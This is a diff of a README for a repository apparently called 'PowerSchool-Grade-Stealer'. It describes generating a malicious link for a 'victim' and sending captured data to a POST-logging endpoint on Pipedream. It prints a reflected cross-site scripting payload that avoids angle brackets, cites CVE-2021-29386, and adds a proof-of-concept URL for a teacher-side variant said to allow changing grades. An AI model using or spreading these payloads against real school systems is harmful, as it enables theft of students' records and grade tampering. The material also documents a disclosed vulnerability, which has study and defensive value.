@@ -1,6 +1,6 @@
 # PowerSchool-Grade-Stealer
 
-The script in this repository generates a link for the victim to click on, but it only works on macOS and Linux (if you remove the pbcopy command). A link can be created manually by doing the following:
+The script in this repository just generates the link for the victim to click on, but it only works on macOS and Linux (if you remove the pbcopy command). A link can be created manually by doing the following:
 
 1. Set up an endpoint URL that logs POST requests to it (can be set up at [Pipedream](https://pipedream.com) by creating an event source).
 2. In the following text, replace the text in brackets (and the brackets themselves) with the corresponding information that is described in the brackets:
@@ -26,3 +26,8 @@ In the source code, this appears as:
 `sharetype = "";alert()//",`
 
 This bypasses PowerSchool's cross-site scripting mitigation by not using angle brackets. The vulnerability was assigned CVE-2021-29386.
+
+A variant of this vulnerability is also present in the teacher SIS, which can theoretically be used to change grades, though it is harder to exploit due to the fact that it requires sending fields such as a seemingly random student ID.
+
+Proof-of-concept:
+/teachers/formbuilder/forms.html?sharetype=";alert()//
